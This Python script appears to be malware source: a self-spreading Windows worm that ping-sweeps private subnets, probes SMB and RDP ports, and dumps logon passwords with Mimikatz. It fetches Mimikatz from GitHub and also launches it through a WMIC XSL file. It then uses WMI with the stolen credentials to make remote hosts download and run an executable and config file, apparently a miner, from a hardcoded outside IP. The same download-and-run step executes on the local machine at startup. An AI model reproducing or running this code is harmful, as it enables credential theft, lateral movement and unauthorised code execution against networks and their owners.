#encoding:utf-8
import subprocess
import re
import socket
import _socket
import wmi
import os
import time

def cmd(command):
	p = subprocess.Popen(command, shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, 	stderr=subprocess.STDOUT)
	(output, err) = p.communicate()
	return output

def network_ip():
	target_ip = []
	alive_ip = []
	command = "ipconfig"
	cmd_reslut = cmd(command)
	target_ip_list = re.findall(r'(\d+\.\d+\.\d+)\.\d+',cmd_reslut.decode("gbk"))

	try:
		for ip in set(target_ip_list):
			if ip[0:3] == "10." or (ip[0:3] == "172" and int(ip[4:6]) > 15 and int(ip[4:6]) < 32) or (ip[0:7] == "192.168"):
				if ip not in target_ip:
					target_ip.append(ip)
			else:
				pass
	except Exception:
		pass

	for local_ip in target_ip:
		alive_commond = 'for /l %i in (1,1,255) do @ ping {}.{}.{}.%i -w 1 -n 1|findstr /i "ttl="'.format(local_ip.split(".")[0],local_ip.split(".")[1],local_ip.split(".")[2])
		cmd_reslut = cmd(alive_commond)
		for ip in re.findall(r'\d+\.\d+\.\d+\.\d+',cmd_reslut.decode("gbk")):
			alive_ip.append(ip)
	#print (alive_ip)
	if len(alive_ip) > 0:
		return (alive_ip)

def open_port(ip_list):
	ports = [445,3389]
	smb_list = []
	rdp_list = []
	for ip in ip_list:
		#print (ip)
		for port in ports:
			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				server.connect((ip,port))
				server.settimeout(10)
				#print (ip,port)
				if port == 445:
					smb_list.append(ip)
				elif port == 3389:
					rdp_list.append(ip)
			except Exception as err:
				#print (err)
				pass
			finally:
				server.close()
	return smb_list,rdp_list

def remote(ip_list, user_name, pass_word):
	for ipaddress in ip_list:
		for i in range(len(pass_word)):
			username = user_name[i]
			password = pass_word[i]
			#print username,password
			try:
				c = wmi.WMI(computer=ipaddress, user=username, password=password)
				#cmd_callbat = r"cmd /c powershell (new-object System.Net.WebClient).DownloadFile( 'http://192.168.3.152/exp.exe','C:\windows\temp\exp.exe')"
				cmd_callbat = r"cmd /c echo powershell (new-object System.Net.WebClient).DownloadFile( 'http://74.108.67.171:199/web/js/blob','C:\windows\temp\xm.exe') >C:\\windows\\temp\\1.bat && echo powershell (new-object System.Net.WebClient).DownloadFile( 'http://74.108.67.171:199/web/js/config_ss','C:\windows\temp\cofig.json') >> C:\\windows\\temp\\1.bat && echo C:\windows\temp\xm.exe >>C:\\windows\\temp\\1.bat && start C:\\windows\\temp\\1.bat"
				c.Win32_Process.Create(CommandLine=cmd_callbat)
			except Exception:
				pass

def mlmlkatz():
	user_name = []
	pass_word = []

	_cmd = '''powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"'''
	power_text = cmd(_cmd)
	user_list = re.findall(r'\* Username \: (.*)',power_text)
	passwd_list = re.findall(r'\* Password : (.*)',power_text)
	if len(user_list) > 0:
		for user in user_list:
			if user.strip("\r") !="(null)" and user.strip("\r") not in user_name and "-" not in user.strip("\r").upper():
				user_name.append(user.strip("\r").strip())
	if len(passwd_list) > 0:
		for password in passwd_list:
			if  password.strip("\r") != "(null)" and password.strip("\r") not in pass_word:
				pass_word.append(password.strip("\r").strip())
				#print "powershell"

	if len(pass_word) == 0:#
		#print "powershell Error"
		command = 'wmic os get /format:"C:\\windows\\temp\\mimi.xsl"'
		p = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE,universal_newlines=True)# stdout=subprocess.PIPE, 	stderr=subprocess.STDOUT
		p.stdin.write('sekurlsa::logonpasswords' + "\n")
		while p.poll() is None: 
			line = p.stdout.readline().decode('gbk').strip()
			if "Username" in line:
				users = re.findall(r'\* Username \: (.*)',line)
				for username in users:
					if username != '(null)' and username not in user_name and "-" not in username.upper():
						user_name.append(username)
			elif "Password" in line:
				passwords = re.findall(r'\* Password : (.*)',line)
				for password in passwords:
					if password != '(null)' and password not in pass_word:
						pass_word.append(password)
			if len(user_name) > 0 and len(pass_word) > 0:
				os.system("taskkill /F /IM WMIC.exe")
	return user_name,pass_word
def sel():
	cmd_= r"cmd /c echo powershell (new-object System.Net.WebClient).DownloadFile( 'https://gist.github.com/manasmbellani/7f3e39170f5bc8e3a493c62b80e69427/raw/87550d0fc03023bab99ad83ced657b9ef272a3b2/mimikatz.xsl','C:\windows\temp\mimi.xsl') >C:\\windows\\temp\\1.bat && echo powershell (new-object System.Net.WebClient).DownloadFile( 'http://74.108.67.171:199/web/js/blob','C:\windows\temp\xm.exe') >>C:\\windows\\temp\\1.bat && echo powershell (new-object System.Net.WebClient).DownloadFile( 'http://74.108.67.171:199/web/js/config_ss','C:\windows\temp\cofig.json') >> C:\\windows\\temp\\1.bat && echo C:\windows\temp\xm.exe >>C:\\windows\\temp\\1.bat && start C:\\windows\\temp\\1.bat"
	os.system(cmd_)
	#print "sel finish"
if __name__ == '__main__':
        sel()
	try:
		ali_ip_list = network_ip()
		#print ali_ip_list
	except Exception :
		pass
	try:
		smb_ip,rdp_ip = open_port(ali_ip_list)
		#print smb_ip
	except Exception:
		pass
	try:
		user,pwd = mlmlkatz()
		#print user
	except Exception:
		pass
	remote(rdp_ip,user,pwd)

